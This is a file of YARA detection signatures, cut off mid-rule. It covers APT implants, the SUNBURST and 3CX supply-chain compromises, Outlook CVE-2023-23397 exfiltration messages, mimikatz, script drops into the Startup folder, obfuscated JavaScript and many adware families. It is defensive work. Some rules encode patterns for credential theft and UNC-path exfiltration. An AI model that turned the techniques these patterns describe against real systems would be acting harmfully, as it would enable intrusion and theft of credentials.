rule SSC_IMPLANT_11_v12 {
meta:
description = "Mini Duke Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {63 74 00 00} // ct
$STR2 = {72 6F 74 65} // rote
$STR3 = {75 61 6C 50} // triV
$STR4 = {56 69 72 74} // Plau
$STR5 = { e8 00 00 00 00 }
$STR6 = { 64 FF 35 00 00 00 00 }
$STR7 = {D2 C0}
$STR8 = /\x63\x74\x00\x00.{3,20}\x72\x6F\x74\x65.{3,20}\x75\x61\x6C\x50.{3,20}\x56\x69\x72\x74/
condition:
(uint16(0) == 0x5A4D) and #STR5 > 4 and all of them
}
rule SSC_IMPLANT_12_v1 {
meta:
description = "Cosmic Duke Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$FUNC = {A1 [3-5] 33 C5 89 [2-3] 56 57 83 [4-6] 64}
condition:
(uint16(0) == 0x5A4D) and $FUNC
}
rule SSC_Unidentified_Malware_Two {
meta:
description = "Unidentified Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$my_string_one = "/zapoy/gate.php"
$my_string_two = { E3 40 FE 45 FD 0F B6 45 FD 0F B6 14 38 88 55 FF 00 55
FC 0F B6 45 FC 8A 14 38 88 55 FE 0F B6 45 FD 88 14 38 0F B6 45 FC 8A
55 FF 88 14 38 8A 55 FF 02 55 FE 8A 14 3A 8B 45 F8 30 14 30 }
$my_string_three = "S:\\Lidstone\\renewing\\HA\\disable\\In.pdb"
$my_string_four = { 8B CF 0F AF CE 8B C6 99 2B C2 8B 55 08 D1 F8 03 C8
8B 45 FC 03 C2 89 45 10 8A 00 2B CB 32 C1 85 DB 74 07 }
$my_string_five = "fuckyou1"
$my_string_six = "xtool.exe"
condition:
($my_string_one and $my_string_two)
or ($my_string_three or $my_string_four)
or ($my_string_five and $my_string_six)
}
rule SSC_MITRE_AutoGen_TMPInjx_33921
{
strings:
$s1 = "get_password"
$s2 = { ?3 72 65 61 74 65 }
$s3 = "xml"
$s4 = "ShutdownMode"
$s5 = "login_Load"
$s6 = "encrypted"
$s7 = "card"
$s8 = ".exe"
condition:
all of them and filesize > 500KB and filesize < 800KB
}
rule SSC_FollinaX
{
meta:
author = "Joe Security"
reference = "https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e"
strings:
$msdt1 = "ms-msdt:/id" ascii wide nocase
$parameter1 = "IT_RebrowseForFile" ascii wide nocase
condition:
all of them
}
rule SSC_Win_SamSamA_TRJNx {
meta:
author = "Felix Bilstein - yara-signator at cocacoding dot com"
date = "2020-04-21"
version = "1"
description = "autogenerated rule brought to you by yara-signator"
tool = "yara-signator v0.3.1"
malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.samsam"
malpedia_version = "20200421"
malpedia_license = "CC BY-SA 4.0"
malpedia_sharing = "TLP:WHITE"
strings:
$sequence_0 = { 082b c883e10f 03c1 1bc9 0bc1 59 e9???????? }
// n = 7, score = 200
//   082b                 | or                  byte ptr [ebx], ch
//   c883e10f             | enter               -0x1e7d, 0xf
//   03c1                 | add                 eax, ecx
//   1bc9                 | sbb                 ecx, ecx
//   0bc1                 | or                  eax, ecx
//   59                   | pop                 ecx
//   e9????????           |
$sequence_1 = { ec 8b4508 56 33f6 3bc6 751d e8???????? }
// n = 7, score = 200
//   ec                   | in                  al, dx
//   8b4508               | mov                 eax, dword ptr [ebp + 8]
//   56                   | push                esi
//   33f6                 | xor                 esi, esi
//   3bc6                 | cmp                 eax, esi
//   751d                 | jne                 0x1f
//   e8????????           |
$sequence_2 = { ec 83ec10 53 ff7510 8d4df0 e8???????? }
// n = 6, score = 100
//   ec                   | in                  al, dx
//   83ec10               | sub                 esp, 0x10
//   53                   | push                ebx
//   ff7510               | push                dword ptr [ebp + 0x10]
//   8d4df0               | lea                 ecx, [ebp - 0x10]
//   e8????????           |
$sequence_3 = { ec 83ec10 53 33db 56 57 }
// n = 6, score = 100
//   ec                   | in                  al, dx
//   83ec10               | sub                 esp, 0x10
//   53                   | push                ebx
//   33db                 | xor                 ebx, ebx
//   56                   | push                esi
//   57                   | push                edi
$sequence_4 = { ec 6a0a 6a00 ff7508 e8???????? }
// n = 5, score = 100
//   ec                   | in                  al, dx
//   6a0a                 | push                0xa
//   6a00                 | push                0
//   ff7508               | push                dword ptr [ebp + 8]
//   e8????????           |
condition:
all of them and filesize < 483328
}
rule SSC_MITRE_AutoGen_Drix_11845
{
strings:
$s1 = "OutputDebugString"
$s2 = "Sleep"
$s3 = "GetAdaptersInfo"
condition:
all of them and filesize > 70KB and filesize < 1000KB
}
rule SSC_APT_fancybear_Downdelph_magic : Bootkit{
meta:
author = "Marc Salinas @Bondey_m"
description = "APT28 downdelph magic string"
reference = "https://www.threatminer.org/_reports/2016/eset-sednit-part3%20-%20ESET.pdf#viewer.action=download"
strings:
$str1 = " :3 "
condition:
$str1 at 0
}
rule SSC_APT_fancybear_Downdelph_MBR : Bootkit{
meta:
author = "Marc Salinas @Bondey_m"
description = "APT28 downdelph string on MBR (get your MBR with BOOTICE on Win or #dd if=/dev/sda of=./sda.mbr bs=512 count=1"
reference = "https://www.threatminer.org/_reports/2016/eset-sednit-part3%20-%20ESET.pdf#viewer.action=download"
strings:
$s1 = { 20 3A 33 20 } //string " :3 "
condition:
$s1 at 411  //posicin 0x19b
}
rule SSC_SUSP_EXPL_Msg_CVE_2023_23397_Mar23 {
meta:
description = "MSG file with a PidLidReminderFileParameter property, potentially exploiting CVE-2023-23397"
author = "delivr.to, modified by Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
date = "2023-03-15"
modified = "2023-03-17"
score = 60
reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
strings:
/* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
/* PSETID_Appointment */
$psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
/* PSETID_Meeting */
$psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
/* PSETID Task */
$psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
/* PidLidReminderFileParameter */
$rfp = { 1F 85 00 00 }
/* \\ UNC path prefix - wide formatted */
$u1 = { 00 00 5C 00 5C 00 }
/* not MSI */
$fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
condition:
uint32be(0) == 0xD0CF11E0
and uint32be(4) == 0xA1B11AE1
and 1 of ($psetid*)
and $rfp
and $u1
and not 1 of ($fp*)
}
rule SSC_EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 {
meta:
description = "Detects suspicious .msg file with a PidLidReminderFileParameter property exploiting CVE-2023-23397 (modified delivr.to rule - more specific = less FPs but limited to exfil using IP addresses, not FQDNs)"
author = "delivr.to, Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
date = "2023-03-15"
modified = "2023-03-18"
score = 75
reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
hash = "e7a1391dd53f349094c1235760ed0642519fd87baf740839817d47488b9aef02"
strings:
/* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
/* PSETID_Appointment */
$psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
/* PSETID_Meeting */
$psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
/* PSETID Task */
$psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
/* PidLidReminderFileParameter */
$rfp = { 1F 85 00 00 }
/* \\ + IP UNC path prefix - wide formatted */
$u1 = { 5C 00 5C 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 3? 00 3? 00|3? 00 3? 00|3? 00) }
/* \\ + IP UNC path prefix - regular/ascii formatted for Transport Neutral Encapsulation Format */
$u2 = { 00 5C 5C (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 3? 3?|3? 3?|3?) }
/* not MSI */
$fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
condition:
(
uint16(0) == 0xCFD0 and 1 of ($psetid*)
or
uint32be(0) == 0x789F3E22
)
and any of ( $u* )
and $rfp
and not 1 of ($fp*)
}
rule SSC_EXPL_SUSP_Outlook_CVE_2023_23397_SMTP_Mail_Mar23 {
meta:
author = "Nils Kuhnert"
date = "2023-03-17"
modified = "2023-03-24"
description = "Detects suspicious *.eml files that include TNEF content that possibly exploits CVE-2023-23397. Lower score than EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 as we're only looking for UNC prefix."
score = 60
reference = "https://twitter.com/wdormann/status/1636491612686622723"
strings:
// From:
$mail1 = { 0A 46 72 6F 6D 3A 20 }
// To:
$mail2 = { 0A 54 6F 3A }
// Received:
$mail3 = { 0A 52 65 63 65 69 76 65 64 3A }
// Indicates that attachment is TNEF
$tnef1 = "Content-Type: application/ms-tnef" ascii
$tnef2 = "\x78\x9f\x3e\x22" base64
// Check if it's an IPM.Task or IPM.Appointment
$ipm1 = "IPM.Task" base64
$ipm2 = "IPM.Appointment" base64
// UNC prefix in TNEF
$unc = "\x00\x00\x00\x5c\x5c" base64
condition:
all of ($mail*) and all of ($tnef*) and 1 of ($ipm*) and $unc
}
rule SSC_APT_fnv1a_plus_extra_XOR_in_MSIL_experimental
{
meta:
description = "This rule detects the specific MSIL implementation of fnv1a of the SUNBURST backdoor (standard fnv1a + one final XOR before RET) independent of the XOR-string. (fnv64a_offset and fnv64a_prime are standard constants in the fnv1a hashing algorithm.)"
reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
author = "Arnim Rupp"
license = "https://creativecommons.org/licenses/by-nc/4.0/"
date = "2020-12-22"
hash1 = "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77"
hash2 = "ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6"
hash3 = "019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134"
strings:
$fnv64a_offset = { 25 23 22 84 e4 9c f2 cb }
$fnv64a_prime_plus_gap_plus_xor_ret = { B3 01 00 00 00 01 [8-40] 61 2A 00 00 }
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}
rule SSC_APT_fnv1a_plus_extra_XOR_in_x64_experimental
{
meta:
description = "This rule detects the specific x64 implementation of fnv1a like used in the SUNBURST backdoor (standard fnv1a + one final XOR before RET), rewritten in c. (fnv64a_offset and fnv64a_prime are standard constants in the fnv1a hashing algorithm.)"
reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
author = "Arnim Rupp"
license = "https://creativecommons.org/licenses/by-nc/4.0/"
date = "2020-12-22"
strings:
$fnv64a_offset = { 25 23 22 84 e4 9c f2 cb }
// self compiled c examples end with 31 D0 C3
// C3 followed by NOP/multibyte NOPs to reduce false positives
$fnv64a_prime_plus_gap_plus_xor_ret = { B3 01 00 00 00 01 [4-44] ( 31 | 33 ) [0-1] C3 ( 90 | 66 90 | 0F 1F 00 | 0F 1F 40 00 | 0F 1F 44 00 00 | 66 0F 1F 44 00 00 | 0F 1F 80 00 00 00 00 | 0F 1F 84 00 00 00 00 00 | 66 0F 1F 84 00 00 00 00 00 ) }
condition:
// MZ or ELF
( uint16(0) == 0x5a4d or uint32be(0) == 0x7f454c46 ) and all of them
}
rule SSC_HKTL_mimikatz_icon {
meta:
description = "Detects mimikatz kiwi icon in PE file"
reference = "https://www.virustotal.com/gui/search/main_icon_dhash%253Ae1cd969ac674f863/files"
license = "Detection Rule License 1.1 https://github.com/SigmaHQ/Detection-Rule-License"
author = "Arnim Rupp"
date = "2023-02-18"
score = 65
hash1 = "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1"
hash2 = "1c3f584164ef595a37837701739a11e17e46f9982fdcee020cf5e23bad1a0925"
hash3 = "c6bb98b24206228a54493274ff9757ce7e0cbb4ab2968af978811cc4a98fde85"
hash4 = "721d3476cdc655305902d682651fffbe72e54a97cd7e91f44d1a47606bae47ab"
hash5 = "c0f3523151fa307248b2c64bdaac5f167b19be6fccff9eba92ac363f6d5d2595"
strings:
// random part grabbed from raw mimikatz kiwi icon in binary
$kiwi = {5a c4 bf ff 52 c4 c0 ff 5b c7 c2 ff 68 d4 cc ff 6b d6 cb ff 81 e1 d7 ff 85 e5 da ff 85 e7 db ff 8b ea dd ff 9d f0 e5 ff a3 f1 e7 ff a5 ee e5 ff ad f1 ea ff aa f0 e9 ff bc ff f7 ff 73 d2 d8 ff}
condition:
uint16(0) == 0x5A4D and
$kiwi
// filesize not limited because some files like ab96a7267f4ddb5b2fc4f6dc47a95a2dbc7f98559581eedabdd8edcbfb908a68 have 100MB+
}
rule SSC_HvS_APT37_RAT_loader {
meta:
description = "BLINDINGCAN RAT loader named iconcash.db used by APT37"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Marc Stroebel"
date = "2020-12-15"
hash = "b70e66d387e42f5f04b69b9eb15306036702ab8a50b16f5403289b5388292db9"
reference1 = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
reference2 = "https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a"
condition:
(pe.version_info["OriginalFilename"] contains "MFC_DLL.dll") and
(pe.exports("SMain") and pe.exports("SMainW") )
}
rule SSC_BlackEnergy_DDoS_Bot_Crypter_additional: PEiD
{
strings:
$a = { 55 ?? ?? 81 EC 1C 01 00 00 53 56 57 6A 04 BE 00 30 00 00 56 FF 35 00 20 11 13 6A 00 E8 ?? 03 00 00 ?? ?? 83 C4 10 ?? FF 89 7D F4 0F }
condition:
$a at pe.entry_point
}
rule SSC_BlackEnergy_DDoS_Bot_Crypter: PEiD
{
strings:
$a = { 55 ?? ?? 81 EC 1C 01 00 00 53 56 57 6A 04 BE 00 30 00 00 56 FF 35 00 20 11 13 6A 00 E8 ?? 03 00 00 ?? ?? 83 C4 10 ?? FF 89 7D F4 0F }
condition:
$a at pe.entry_point
}
rule SSC_detect_startup_script_drops {
meta:
description = "Detects files attempting to drop script files in the Windows Startup directory"
strings:
$xx = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
$s2 = ".ps1"
$s3 = ".vbs"
$s4 = ".js"
$s5 = ".jse"
$s6 = ".bat"
$s7 = ".cmd"
$s8 = ".url"
$s9 = ".hta"
$s10 = ".wsf"
$s11 = ".py"
$s12 = ".wsh"
condition:
$xx and
any of ($s*) and
for any i in (0..pe.number_of_resources - 1): (pe.resources[i].type==pe.RESOURCE_TYPE_STRING)
}
rule SSC_SUSP_APT_MAL_NK_3CX_Malicious_Samples_Mar23_1 {
meta:
description = "Detects marker found in malicious DLLs related to 3CX compromise"
author = "X__Junior, Florian Roth (Nextron Systems)"
reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
date = "2023-03-29"
score = 75
hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
hash2 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"
strings:
$opx1 = { 41 80 7C 00 FD FE 75 ?? 41 80 7C 00 FE ED 75 ?? 41 80 7C 00 FF FA 75 ?? 41 80 3C 00 CE }
condition:
$opx1
}
rule SSC_SUSP_3CX_App_Signed_Binary_Mar23_1 {
meta:
description = "Detects 3CX application binaries signed with a certificate and created in a time frame in which other known malicious binaries have been created"
author = "Florian Roth (Nextron Systems)"
date = "2023-03-29"
reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
score = 65
hash1 = "fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405"
hash2 = "dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc"
strings:
$sa1 = "3CX Ltd1"
$sa2 = "3CX Desktop App" wide
$sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 } // Known compromised cert
condition:
uint16(0) == 0x5a4d
and pe.timestamp > 1669680000 // 29.11.2022 earliest known malicious sample
and pe.timestamp < 1680108505 // 29.03.2023 date of the report
and all of ($sa*)
and $sc1 // serial number of known compromised certificate
}
rule SSC_SUSP_3CX_MSI_Signed_Binary_Mar23_1 {
meta:
description = "Detects 3CX MSI installers signed with a known compromised certificate and signed in a time frame in which other known malicious binaries have been signed"
author = "Florian Roth (Nextron Systems)"
date = "2023-03-29"
reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
score = 60
hash1 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
strings:
$a1 = { 84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46 } // MSI marker
$sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 } // Known compromised cert
$s1 = "3CX Ltd1"
$s2 = "202303" // in
condition:
uint16(0) == 0xcfd0
and $a1
and $sc1
and (
$s1 in (filesize-20000..filesize)
and $s2 in (filesize-20000..filesize)
)
}
rule SSC_generic_javascript_obfuscation
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "JavaScript Obfuscation Detection"
sample_filetype = "js-html"
strings:
$string0 = /eval\(([\s]+)?(unescape|atob)\(/ nocase
$string1 = /var([\s]+)?([a-zA-Z_$])+([a-zA-Z0-9_$]+)?([\s]+)?=([\s]+)?\[([\s]+)?\"\\x[0-9a-fA-F]+/ nocase
$string2 = /var([\s]+)?([a-zA-Z_$])+([a-zA-Z0-9_$]+)?([\s]+)?=([\s]+)?eval;/
condition:
any of them
}
rule SSC_AdwareAdGazelleSample
{
meta:
Description  = "Adware.AdGazelle.vb"
ThreatLevel  = "5"
strings:
$ = "D:\\popajar3" ascii wide
$ = "squeakychocolate" ascii wide
$ = "squeaky chocolate" ascii wide
$ = "adxloader.dll" ascii wide
$ = "adxloader.pdb" ascii wide
$ = "adxloader64.dll" ascii wide
$ = "adxloader64.pdb" ascii wide
$ = "d:\\Products\\ADX.IE.8" ascii wide
condition:
any of them
}rule SSC_AdwareAdpeakSample
{
meta:
Description  = "Adware.Adpeak.vb"
ThreatLevel  = "5"
strings:
$ = "dealcabby.dll" ascii wide
$ = "getsavin.dll" ascii wide
condition:
any of them
}rule SSC_AdwarePricePeepSample
{
meta:
Description  = "Adware.PricePeep.vb"
ThreatLevel  = "5"
strings:
$ = "BrandedUpdater" ascii wide
$ = "default_browser" ascii wide
$ = "LaunchDefaultBrowser" ascii wide
$ = "LaunchBrowser" ascii wide
$a1 = "InstallUtil.pdb" ascii wide
$a2 = "C:\\managed\\root\\VTG_" ascii wide
$a3 = "InstallUtil.pdb" ascii wide
$a4 = "BrandedUpdater.pdb" ascii wide
//$a5 = "PricePeep" ascii wide
$a6 = "InstallUtil.cpp" ascii wide
$a7 = "BrandedUpdater.cpp" ascii wide
condition:
(3 of them) or (any of ($a*))
}rule SSC_BetterSurfASample
{
meta:
Description = "Adware.BetterSurf.A.vb"
ThreatLevel = "5"
strings:
$n1 = "Media Buzz" ascii wide
$n2 = "MediaBuzz" ascii wide
//$script1 = "document.getElementById('wsu_js" ascii wide
//$script2 = "script.setAttribute('id','wsu_js" ascii wide
condition:
all of ($n*)
}rule SSC_AdwareBrowseFoxSample
{
meta:
Description  = "Adware.BrowseFox.vb"
ThreatLevel  = "5"
strings:
$a2 = ".expextdll.dll" ascii wide
$a3 = ".IEUpdate.pdb" ascii wide
$a4 = ".Repmon.dll" ascii wide
$a5 = ".BRT.Helper.exe" ascii wide
$a6 = ".BrowserAdapter.pdb" ascii wide
$a7 = ".expextdll.dll" ascii wide
$a8 = ".browseradapter64.exe" ascii wide
$a9 = ".purbrowse.exe" ascii wide
$a10 = "BrowserFilter.exe" ascii wide
$a11 = ".Bromon.dll" ascii wide
$a12 = ".OfSvc.dll" ascii wide
$a13 = ".GCUpdate.dll" ascii wide
$a14 = ".BroStats.dll" ascii wide
$a15 = ".BOAS.dll" ascii wide
$a16 = ".BrowserAdapterS.dll" ascii wide
$a17 = ".PurBrowse64.exe" ascii wide
$b1 = "system32\\drivers\\%s.sys" ascii wide
$b2 = "FilterApp" ascii wide
condition:
(any of ($a*)) or (all of ($b*))
}rule SSC_ConduitASample
{
meta:
Description = "Adware.Conduit.A.vb"
ThreatLevel = "5"
strings:
$ = "GetSpeedBrowserInstalled" ascii wide
$ = "SpeedBrowserAlreadyInstalled" ascii wide
$ = "Injekt SVN - client" ascii wide
condition:
any of them
}
rule SSC_ConduitBSample
{
meta:
Description = "Adware.Conduit.B.vb"
ThreatLevel = "5"
strings:
$ = "CAboutTabsInjector_" ascii wide
$ = "AboutTabsDataUrlPublisher" ascii wide
$ = "AboutTabsDataUrlConduit" ascii wide
$ = "AboutTabsUsageUrl" ascii wide
$ = "AboutTabsEnabledByUser" ascii wide
$ = "AboutTabsEnabledByConduit" ascii wide
$ = "AboutTabsEnabledByPublisher" ascii wide
$ = "SearchInNewTabContent.xml" ascii wide
$ = "CONDUIT_CHEVRON_MUTEX" ascii wide
$ = "CConduitExternalForTBAPI" ascii wide
$ = "EI_Toolbar_Update_Mutex" ascii wide
condition:
any of them
}rule SSC_AdwareConvertAdSample
{
meta:
Description  = "Adware.ConvertAd.vb"
ThreatLevel  = "5"
strings:
$ = "http://download-servers.com/SysInfo/adrouteservice/adrouter.php" ascii wide
$ = "ConvertAd.html" ascii wide
$ = "ConvertAd.exe" ascii wide
condition:
any of them
}rule SSC_AdwareCrossriderSampleA
{
meta:
Description  = "Adware.Crossrider.A.sm"
ThreatLevel  = "5"
strings:
$ = "-bho.dll" ascii wide
$ = "-bho64.dll" ascii wide
$ = "-buttonutil64.dll" ascii wide
$ = "-buttonutil.dll" ascii wide
$ = "-BrowserEventSandBox" ascii wide
$ = "CrossriderApp" ascii wide
$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe" ascii wide
$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe" ascii wide
$ = "IEInject_Win32.dll" ascii wide
$ = "bg_debug.js" ascii wide
$ = "new_debug.js" ascii wide
$ = "Browser Process id" ascii wide
$ = "BHO Process id" ascii wide
$ = "BhoRunningVersion" ascii wide
$ = "-nova64.dll" ascii wide
$str1 = "crossrider-buttonutil.pdb" ascii wide
$str2 = "AVCCrossriderButtonHelper" ascii wide
$str3 = "AVCCrossRiderLogger" ascii wide
$str5 = "AddCrossRiderSearchProvider" ascii wide
$str6 = "C:\\BUILD_AVZR2\\WhiteRabbit" ascii wide
$str7 = "CrossriderBHO" ascii wide
$str8 = "215AppVerifier" ascii wide
$str9 = "Crossrider BHO Version" ascii wide
$str10 = "brightcircleinvestments.com" ascii wide
$str11 = "CrossriderNotification.pdb" ascii wide
$str12 = "C:\\Users\\cross\\Desktop\\compilation_bot_area" ascii wide
condition:
(3 of them) or (any of ($str*))
}
rule SSC_AdwareCrossriderSampleB
{
meta:
Description  = "Adware.Crossrider.B.vb"
ThreatLevel  = "5"
strings:
$ = "crossbrowse/updater/{{camp_id}}/{{version}}/{{secret}}/update.json" ascii wide
$ = "Crossbrowse\\Crossbrowse\\Application\\crossbrowse.exe" ascii wide
$ = "allnetserveline.com/crossbrowse" ascii wide
$ = "C:\\workspace\\crossbrowse" ascii wide
$ = "CrossriderBrowserInstaller.pdb" ascii wide
condition:
any of them
}
rule SSC_AdwareDealPlySample
{
meta:
Description  = "Adware.DealPly.vb"
ThreatLevel  = "5"
strings:
$ = "dealply.prq" ascii wide
condition:
any of them
}rule SSC_AdwareDlhelperAdSample
{
meta:
Description  = "Adware.Dlhelper.vb"
ThreatLevel  = "5"
strings:
$ = "trifonov@onegbsoft.ru" ascii wide
$ = "bulovackiy@dontehnoservis.com.ua" ascii wide
$ = "contacts@dayzgames.com" ascii wide
$ = "admin@mayris.org" ascii wide
$ = "Panel_OffersList" ascii wide
$ = "support@dlhelper.com" ascii wide
$ = "http://dlhelper.com" ascii wide
$ = "http://sendme9.ru" ascii wide
$ = "http://sendme3.ru" ascii wide
$ = "http://trustfile3.ru" ascii wide
$ = "http://trustfile9.ru" ascii wide
$ = "http://downloaditeasy.ru" ascii wide
condition:
any of them
}rule SSC_AdwareDownloaderA
{
meta:
Description  = "Adware.Downloader.A.vb"
ThreatLevel  = "5"
strings:
$ = "odiassi" ascii wide
$ = "stavers" ascii wide
$ = "trollimog" ascii wide
$ = "diapause" ascii wide
$ = "UserControl1" ascii wide
$ = "listboxmod01" ascii wide
condition:
all of them
}rule SSC_AdwareELEXSampleA
{
meta:
Description  = "Adware.ELEX.A.vb"
ThreatLevel  = "5"
strings:
$ = "www.freeappstools.com" ascii wide
$ = "dl.elex.soft365.com" ascii wide
$ = "E:\\Code\\FileSyn\\Bin" ascii wide
$ = "E:\\Code_SVN\\FileSyn\\Bin" ascii wide
condition:
any of them
}
rule SSC_AdwareELEXSampleB
{
meta:
Description  = "Adware.ELEX.B.vb"
ThreatLevel  = "5"
strings:
$pdb = "Release\\SFKEX.pdb" ascii wide
$ = "21e223b3f0c97db3c281da1g7zccaefozzjcktmlma" ascii wide
$ = "http://xa.xingcloud.com/v4/sof-everything" ascii wide
$ = "http://www.mysearch123.com" ascii wide
$ = "SFKEX.exe" ascii wide
$ = "SFKEX.dll" ascii wide
$ = "SFKURL" ascii wide
condition:
2 of them
}
rule SSC_AdwareELEXSampleCommon
{
meta:
Description  = "Adware.ELEX.vb"
ThreatLevel  = "5"
strings:
$ = "\\Mozilla\\Firefox\\" ascii wide
$ = "profiles.ini" ascii wide
$ = "Profile0" ascii wide
$ = "\\prefs.js" ascii wide
$ = "\\Google\\Chrome\\User Data\\" ascii wide
$ = "\\Secure Preferences" ascii wide
$ = "Software\\Microsoft\\Internet Explorer\\Main" ascii wide
$ = "Start Page" ascii wide
$ = "chrome.exe" ascii wide
$ = "iexplore.exe" ascii wide
$ = "firefox.exe" ascii wide
$ = "user_pref" ascii wide
$ = "browser.startup.homepage" ascii wide
$ = "startup_urls" ascii wide
condition:
all of them
}rule SSC_AdwareStormWatchSample
{
meta:
Description  = "Adware.StormWatch.vb"
ThreatLevel  = "5"
strings:
$ = "localstormwatch.com" ascii wide
$ = "StormWatch.pdb" ascii wide
$ = "StormWatch.exe" ascii wide
$ = "ActiveDeals" ascii wide
condition:
any of them
}rule SSC_AdwareGenieoSample
{
meta:
Description = "Adware.Genieo.vb"
ThreatLevel = "5"
strings:
$h1 = "gentray.pdb" ascii wide
$h2 = "genupdater.pdb" ascii wide
$h3 = "www.genieo.com" ascii wide
$h4 = "userfeedback-genieo.appspot.com" ascii wide
$h5 = "Genieo Innovation LTD" ascii wide
$str1 = "Software\\Genieo" ascii wide
$str2 = "SOFTWARE\\Genieo" ascii wide
$str5 = "genieo.exe" ascii wide
$str6 = "genieutils.exe" ascii wide
$str7 = "genupdater.exe" ascii wide
$str8 = "__Genieo_" ascii wide
$str9 = "GenieoUpdaterServiceCleaner" ascii wide
$str10 = "GENIEO_TRAY_UI" ascii wide
condition:
any of them
}rule SSC_AdwareImaliSample
{
meta:
Description  = "Adware.Imali.vb"
ThreatLevel  = "5"
strings:
$ = "www.freemediaplayer.tv" ascii wide
condition:
any of them
}rule SSC_AdwareInstallCoreSample
{
meta:
Description  = "Adware.InstallCore.vb"
ThreatLevel  = "5"
strings:
$ = "www.mynicepicks.com" ascii wide
